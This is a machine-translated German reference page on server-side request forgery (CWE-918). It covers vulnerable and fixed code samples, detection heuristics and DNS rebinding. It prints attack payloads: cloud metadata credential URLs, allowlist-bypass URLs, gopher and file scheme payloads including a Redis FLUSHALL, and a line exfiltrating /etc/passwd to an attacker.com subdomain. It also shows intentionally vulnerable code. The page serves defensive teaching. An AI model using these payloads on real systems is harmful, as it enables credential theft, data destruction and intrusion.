---
description: "CWE-918: Der Server sendet HTTP-/Protokollanfragen an vom Angreifer kontrollierte URLs, wodurch interne Dienste und Cloud-Metadaten offengelegt werden und Protocol Smuggling möglich wird."
date: 2026-04-16
tags: [security, cwe, ssrf, cloud, metadata, internal-network, http-client]
level: Advanced
source_sha256: 4752910557846d55badd3c2304e3442bb0ee1c876b1bcf51f4667b57a95c9d08
translation: machine
translated_at: '2026-10-24'
---
# CWE-918: Server-Side Request Forgery {#cwe-918-server-side-request-forgery}

**CWE-918** | OWASP Top 10 A10:2021 | CVSS-Basiswert-Bereich: 5.0-9.8 (Kritisch, wenn Cloud-Metadaten erreichbar sind) | Rang 19 in den CWE Top 25

## Funktionale Semantik {#functional-semantics}

SSRF veranlasst den Server, im Auftrag des Angreifers als HTTP-Proxy zu agieren. Die Netzwerkidentität des Servers, seine IAM-Credentials und seine Vertrauensbeziehungen werden für den Angreifer zugänglich. In Cloud-Umgebungen legt der Metadatendienst unter `169.254.169.254` (AWS IMDSv1, GCP, Azure) Instanz-Credentials, Rollen und interne Konfiguration ohne Authentifizierung offen. In On-Premises-Umgebungen ermöglicht SSRF das Scannen und Ausnutzen interner Dienste, die auf die Perimeter-Sicherheit vertrauen.

Es gibt zwei SSRF-Klassen: **Full SSRF** (die Antwort wird an den Angreifer zurückgegeben) und **Blind/Partial SSRF** (keine Antwort, aber Nebenwirkungen treten auf – ein DNS-Lookup bestätigt die Erreichbarkeit, ein POST löst eine Zustandsänderung aus, das Timing verrät den Portstatus).

## Ursache {#root-cause}

Anwendungen konstruieren ausgehende URLs aus vom Angreifer kontrollierten Bestandteilen (vollständige URL, Hostname, Pfadsegment, IP), ohne das aufgelöste Netzwerkziel zu validieren. Inkonsistenzen beim URL-Parsing zwischen der Validierungsschicht und der HTTP-Client-Schicht erzeugen Umgehungsmöglichkeiten, selbst wenn Allowlists existieren.

## Auslösebedingungen {#trigger-conditions}

- Benutzer liefert eine URL für: Abruf von Bildern/Dateien, Registrierung von Webhooks, URL-Vorschau, PDF-Erzeugung, OAuth-Callback, Import von einem externen Dienst, Health-Check-Endpunkt
- Anwendung konstruiert eine URL aus einem benutzerseitig gelieferten Hostnamen, Pfad oder Query-Parameter
- Parameter `redirect_uri`, `callback_url`, `next`, `return_to` werden serverseitig ohne Validierung des Ziels verfolgt
- Interne Dienste besitzen keine Authentifizierung, da angenommen wird, dass nur das interne Netzwerk sie erreichen kann

## Betroffene Umgebungen {#affected-ecosystems}

| Kontext | Typischer SSRF-Vektor | Risiko |
|---|---|---|
| AWS EC2/Lambda | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Exfiltration von Credentials → vollständige Account-Übernahme |
| AWS IMDSv2 | Erfordert PUT + Session-Token – mindert einfache SSRF ab | Niedriger (aber weiterhin über TOCTOU verwundbar) |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` + Header `Metadata-Flavor: Google` | Exfiltration des Service-Account-Tokens |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true` | Exfiltration des MSI-Tokens |
| Kubernetes | `https://kubernetes.default.svc/` von Pods aus erreichbar | Zugriff auf den API-Server mit dem Service-Account des Pods |
| Docker-Socket | `http://localhost:2375/containers/json` (falls exponiert) | Container-Escape |
| Interne HTTP-Dienste | Redis (`gopher://`), Elasticsearch, Consul, etcd | Unauthentifizierter Datenzugriff |

## Verwundbare Muster {#vulnerable-patterns}

### Einfache SSRF – benutzergesteuerte URL wird direkt abgerufen {#basic-ssrf-user-controlled-url-fetched-directly}

```python
# VULNERABLE: attacker sends url=http://169.254.169.254/latest/meta-data/iam/...
import requests
from flask import request, jsonify

@app.route("/fetch-preview")
def fetch_preview():
    url = request.args.get("url")
    resp = requests.get(url, timeout=5)  # no validation, follows redirects by default
    return jsonify({"content": resp.text[:500]})
```

### Protocol Smuggling über gopher:// {#protocol-smuggling-via-gopher}

```text
# gopher:// allows arbitrary TCP payloads — can send Redis commands, SMTP, etc.
GET /fetch?url=gopher://internal-redis:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
```

### Partielle SSRF – Webhook-Registrierung {#partial-ssrf-webhook-registration}

```javascript
// VULNERABLE: attacker registers internal URL as webhook
// No content returned but POST triggers state change in internal service
app.post("/webhooks/register", async (req, res) => {
    const { callbackUrl } = req.body;
    // No validation — attacker uses http://internal-billing-service/admin/reset
    await db.save({ userId: req.user.id, webhook: callbackUrl });
    // Later, on event: axios.post(callbackUrl, eventData)
    res.json({ ok: true });
});
```

### Umgehung durch URL-Parsing – Umgehung der Allowlist {#url-parsing-bypass-allowlist-circumvention}

```python
# VULNERABLE: parseurl and requests disagree on authority
from urllib.parse import urlparse
import requests

ALLOWLIST = {"api.example.com", "cdn.example.com"}

def fetch_safe(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWLIST:
        raise ValueError("Domain not allowed")
    # Bypasses:
    # http://api.example.com@192.168.1.1/ — urlparse.hostname = "api.example.com", requests connects to 192.168.1.1
    # http://api.example.com#@192.168.1.1/ — fragment confusion
    # http://192.168.1.1%2F@api.example.com/ — URL encoding
    return requests.get(url)
```

## Korrigierte Muster {#fixed-patterns}

### Allowlist mit IP-Prüfung nach der Auflösung {#allowlist-with-post-resolution-ip-check}

```python
import socket
import ipaddress
import requests
from urllib.parse import urlparse

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

# RFC 1918 + link-local + loopback ranges
BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),   # link-local / metadata
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),          # IPv6 ULA
]

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
    except Exception:
        return False

    # Allowlist by hostname (before DNS resolution)
    if parsed.hostname not in ALLOWED_HOSTS:
        return False

    # Enforce scheme
    if parsed.scheme not in ("http", "https"):
        return False

    # Resolve DNS and check every returned IP
    try:
        infos = socket.getaddrinfo(parsed.hostname, parsed.port or 443)
    except socket.gaierror:
        return False

    for (_fam, _type, _proto, _canon, sockaddr) in infos:
        ip = ipaddress.ip_address(sockaddr[0])
        if any(ip in net for net in BLOCKED_NETWORKS):
            return False

    return True

def fetch_url(url: str):
    if not is_safe_url(url):
        raise PermissionError("URL not allowed")
    # disable_redirects: each redirect must be re-validated
    resp = requests.get(url, allow_redirects=False, timeout=5)
    if resp.status_code in (301, 302, 303, 307, 308):
        return fetch_url(resp.headers["Location"])  # recursive re-validation
    return resp
```

### Erzwingen von IMDSv2 (Korrektur auf Infrastrukturebene in AWS) {#imdsv2-enforcement-aws-infrastructure-level-fix}

```bash
# Require IMDSv2 — PUT + TTL token required before GET; mitigates most SSRF
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-put-response-hop-limit 1 \
  --http-tokens required
```

### Webhook – interne Ziele bereits bei der Registrierung ablehnen {#webhook-deny-internal-destinations-at-registration}

```javascript
const dns = require("dns").promises;
const ipRangeCheck = require("ip-range-check"); // npm: ip-range-check

const BLOCKED_RANGES = [
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "169.254.0.0/16", "127.0.0.0/8", "::1/128"
];

async function validateWebhookUrl(urlStr) {
    const url = new URL(urlStr); // throws on malformed
    if (!["http:", "https:"].includes(url.protocol)) throw new Error("Protocol not allowed");

    const { address } = await dns.lookup(url.hostname);
    if (ipRangeCheck(address, BLOCKED_RANGES)) {
        throw new Error("Internal addresses not allowed for webhooks");
    }
    return true;
}
```

## Erkennungsheuristiken {#detection-heuristics}

**Auslöser für statische Analyse:**
- `requests.get(url)`, `urllib.request.urlopen(url)`, `httpx.get(url)`, wobei `url` aus Request-Parametern stammt
- `axios.get(req.body.url)`, `fetch(req.query.callbackUrl)` – direkter Fluss vom Parameter zum HTTP-Client
- `curl_exec($ch)` nach `curl_setopt($ch, CURLOPT_URL, $_GET[...])` in PHP
- `java.net.URL(userInput).openStream()` oder `HttpClient.send()` mit benutzergesteuertem URI
- URL wird per String-Konkatenation erzeugt: `"http://" + req.params.host + "/api/"`
- `allow_redirects=True` (Standard in requests) in Kombination mit einer benutzergelieferten URL

**Auslöser in der Konfiguration:**
- IMDSv1 auf EC2-Instanzen nicht deaktiviert (kein `--http-tokens required`)
- Pod-Service-Account mit übermäßigen RBAC-Berechtigungen (SSRF → Kubernetes-API)
- Docker-API auf `0.0.0.0:2375` exponiert (ohne TLS, von Containern erreichbar)

**Indikatoren für Fehlalarme:**
- URL wird aus einer statischen Allowlist ohne benutzerkontrollierte Komponente konstruiert (z. B. `WEBHOOK_URL = os.getenv("WEBHOOK_URL"); requests.post(WEBHOOK_URL, data=payload)`) – die Umgebungsvariable wird zur Deploy-Zeit gesetzt und ist nicht benutzerkontrolliert.
- Abruf einer benutzergelieferten URL, bei dem die aufgelöste IP erzwungenermaßen außerhalb von RFC 1918 liegt *und* Redirects deaktiviert sind *und* der Antwortinhalt nicht an den Anfragenden zurückgegeben wird (Blind-Abruf für nicht sicherheitsrelevante Zwecke) – trotzdem zur Prüfung markieren, jedoch mit geringerem Schweregrad.
- Interne Health-Check-Dienste, die sich absichtlich selbst über localhost aufrufen.

## DNS-Rebinding {#dns-rebinding}

DNS-Rebinding umgeht IP-basierte Allowlists, indem bei der ersten Auflösung eine gültige IP zurückgegeben wird (die Prüfung besteht), bei nachfolgenden Auflösungen – die der HTTP-Client nutzt – dann eine private IP. Gegenmaßnahme: DNS einmal auflösen, die IP für die Lebensdauer der Verbindung fixieren und blockieren, wenn sich die IP ändert.

```python
# Pattern to detect: check at validation time, connect at different time
# VULNERABLE sequence:
ip = socket.gethostbyname(hostname)  # returns 93.184.216.34 (valid)
check_ip_not_private(ip)             # passes
time.sleep(0.1)                      # TTL expires, attacker's DNS returns 10.0.0.1
requests.get(f"http://{hostname}/")  # connects to 10.0.0.1
```

## Payloads für Protocol Smuggling {#protocol-smuggling-payloads}

Wenn der HTTP-Client Nicht-HTTP-Schemata unterstützt (curl, Java URL, einige Python-Bibliotheken):

| Schema | Wirkung |
|---|---|
| `file:///etc/passwd` | Lesen lokaler Dateien |
| `gopher://redis:6379/_FLUSHALL` | Beliebige TCP-Payload (Redis, SMTP, FTP) |
| `dict://redis:6379/INFO` | Abfrage über das Dict-Protokoll |
| `ftp://internal-ftp/` | FTP-Verzeichnisauflistung |
| `http://localhost:9200/_cat/indices` | Elasticsearch über Loopback |

Abhilfe: Nur `http` und `https` in der Allowlist zulassen; alle anderen Schemata vor dem Verbindungsaufbau ablehnen.

## Auswirkungen partieller SSRF {#partial-ssrf-impact}

Auch ohne dass der Antwortinhalt an den Angreifer zurückgegeben wird:
- **Port-Scanning** über Timing: verbindung verweigert (<10 ms) vs. gefiltert (Timeout) vs. offen (>0 ms Antwort)
- **DNS-Exfiltration** über Subdomain: `http://$(cat /etc/passwd | base64).attacker.com/` in einer SSTI → SSRF-Kette
- **Zustandsänderung** durch POST an interne Admin-Endpunkte (Passwort-Reset, Cache-Leerung, Job-Auslösung)
- **Log-Injection**, indem ein interner Dienst vom Angreifer kontrollierte Daten protokolliert

## Siehe auch {#see-also}

- [[cwe-502-deserialization]] – SSRF auf Redis/Memcache kann Deserialisierungs-Gadget-Ketten auslösen
- CWE-020: Input Validation – URL-Validierung ist die primäre Kontrolle
- CWE-601: Open Redirect – ein Open Redirect kann verkettet werden, um SSRF-Allowlists zu umgehen (Weiterleitung auf intern)
- CWE-611: XML External Entities – XXE kann über das Nachladen externer Entitäten eine SSRF auslösen
